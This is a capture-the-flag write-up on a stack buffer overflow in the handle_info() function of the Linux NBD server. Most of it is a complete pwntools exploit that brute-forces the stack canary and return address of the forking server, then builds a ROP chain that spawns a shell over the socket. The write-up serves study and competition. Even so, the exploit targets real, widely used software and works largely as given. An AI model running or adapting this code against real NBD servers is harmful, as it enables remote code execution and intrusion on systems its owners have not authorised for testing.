# Who Moved My Block

Category: Clone-and-Pwn

Solves: 12

Points: 276

Main solvers: jinmo123, Qwaz

Write-up author: Qwaz

---

## Challenge Description

> On Linux, network block device (NBD) is a network protocol that can be used to forward a block device (typically a hard disk or partition) from one machine to a second machine. As an example, a local machine can access a hard disk drive that is attached to another computer.
>
> https://github.com/NetworkBlockDevice/nbd

## Write-up

Zero-day challenge in Linux network block device.
There is a buffer overflow in `handle_info()` function.

```c
static bool handle_info(CLIENT* client, uint32_t opt, GArray* servers, uint32_t cflags) {
	uint32_t namelen, len;
	char *name;
	int i;
	SERVER *server = NULL;
	uint16_t n_requests;
	uint16_t request;
	char buf[1024];
	bool sent_export = false;
	uint32_t reptype = NBD_REP_ERR_UNKNOWN;
	char *msg = "Export unknown";

	socket_read(client, &len, sizeof(len));
	len = htonl(len);
	socket_read(client, &namelen, sizeof(namelen));
	namelen = htonl(namelen);
	if(namelen > (len - 6)) {
		send_reply(client, opt, NBD_REP_ERR_INVALID, -1, "An OPT_INFO request cannot be smaller than the length of the name + 6");
		socket_read(client, buf, len - sizeof(namelen));
	}

    // ...
```

Both `len` and `namelen` can be controlled by an attacker,
so `socket_read()` lead to a stack overflow.
Thanks to the daemonized fork server,
we can brute-force the stack canary and get a shell with ROP.

```python
# Exploit written by jinmo123
from pwn import *
import multiprocessing

context.log_level = "error"
context.arch = "amd64"


def trial(args):
    (payload, oracle) = args
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con = remote("47.242.113.232", 49191)

    con.send(
        flat(
            p32(1, endian="big") + b"IHAVEOPT",
            # NBD_OPT_INFO to trigger handle_info
            p32(6, endian="big"),
            p32(len(payload) + 4, endian="big"),  # len
            p32(0x2000, endian="big"),  # namelen
            payload,
            b"x" * 0x2000,
            p16(0),
        )
    )
    if oracle is None:
        return con
    con.send(
        b"IHAVEOPT" + p32(5, endian="big") + p32(0, endian="big") * 2,
    )
    try:
        con.shutdown(socket.SHUT_WR)
    except:
        pass
    payload = b""
    while True:
        try:
            chunk = con.recv(1024)
        except:
            break
        if not chunk:
            break
        payload = payload + chunk
    if oracle(payload):
        print("yey")
        return True


def is_tls(payload):
    return b"TLS" in payload


def is_zero(payload):
    return payload[-1] == 0


def main():
    canary = b"\x00"
    p = multiprocessing.Pool(4)
    while len(canary) < 8:
        base = b"x" * 1032 + canary
        canary += bytes(
            [
                p.map(trial, [(base + bytes([i]), is_tls) for i in range(256)]).index(
                    True
                )
            ]
        )
        print(canary)

    retaddr = b"\xac"
    while len(retaddr) < 6:
        base = b"x" * 1032 + canary + b"x" * 0x20 + p64(4) + p64(0) * 2 + retaddr
        target = range(256) if len(retaddr) > 1 else range(0xD, 256, 16)
        res = bytes(
            [p.map(trial, [(base + bytes([i]), is_zero) for i in target]).index(True)]
        )
        if len(retaddr) == 1:
            res = bytes([res[0] * 0x10 + 0xD])
        retaddr += res
        print(canary, retaddr)

    cmd = b"/bin/sh <&4 >&4\x00"
    binary = u64(retaddr + b"\x00\x00") - 0xBDAC
    _ = lambda x: binary + x
    bss = 0x13200
    con = trial(
        (
            flat(
                {
                    1032: [
                        canary,
                        0,
                        0,
                        1,
                        4,
                        _(bss),
                        len(cmd),
                        _(0x12D00),
                        _(0xC290),
                        0,
                        0,
                        0,
                        0,
                        0,
                        0,
                        0,
                        _(0x4518),
                        _(0x4A58),
                        _(bss),
                        _(0x3BB0),
                    ]
                }
            ),
            None,
        )
    )
    con.send(cmd)
    con.send(b"cat /mnt/flag.txt >&4; cat<&4\n")
    while True:
        print(con.recv(1024))


if __name__ == "__main__":
    main()
```
